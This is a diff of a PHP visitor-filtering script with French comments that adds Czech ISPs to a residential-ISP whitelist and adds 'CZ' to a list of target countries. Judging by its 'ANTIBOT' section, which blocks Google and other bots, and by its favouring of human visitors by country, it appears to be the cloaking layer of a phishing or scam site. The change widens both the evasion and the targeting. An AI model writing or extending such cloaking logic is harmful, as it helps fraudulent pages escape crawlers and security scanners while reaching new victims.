@@ -102,7 +102,13 @@ $is_known_residential_fai = (
     // ALLEMAGNE + ITALIE + AUTRICHE + LIECHTENSTEIN (comme avant)
     strpos($org_lower, "deutsche telekom") !== false || strpos($org_lower, "vodafone") !== false ||
     strpos($org_lower, "o2") !== false || strpos($org_lower, "tim") !== false ||
-    strpos($org_lower, "a1 telekom") !== false || strpos($org_lower, "telecom liechtenstein") !== false
+    strpos($org_lower, "a1 telekom") !== false || strpos($org_lower, "telecom liechtenstein") !== false ||
+
+    // REPUBLIQUE TCHEQUE
+    strpos($org_lower, "ceske telekomunikace") !== false || strpos($org_lower, "ctk") !== false ||
+    strpos($org_lower, "vodafone cz") !== false || strpos($org_lower, "internet cz") !== false ||
+    strpos($org_lower, "upc cz") !== false || strpos($org_lower, "t-mobile cz") !== false ||
+    strpos($org_lower, "o2 cz") !== false || strpos($org_lower, "lmc") !== false
 );
 
 // ====================== ANTIBOT (Google & bots bloqués à mort) ======================
@@ -126,7 +132,7 @@ if (empty($agent) || $agent === '-' || strlen($agent) < 15) {
 }
 
 // ====================== LOGIQUE D'ACCÈS (humains en priorité) ======================
-$target_countries = ['CH', 'FR', 'DE', 'IT', 'AT', 'LI'];
+$target_countries = ['CH', 'FR', 'DE', 'IT', 'AT', 'LI', 'CZ'];
 
 if (
     // 1. Mobile + pays cible → presque toujours humain
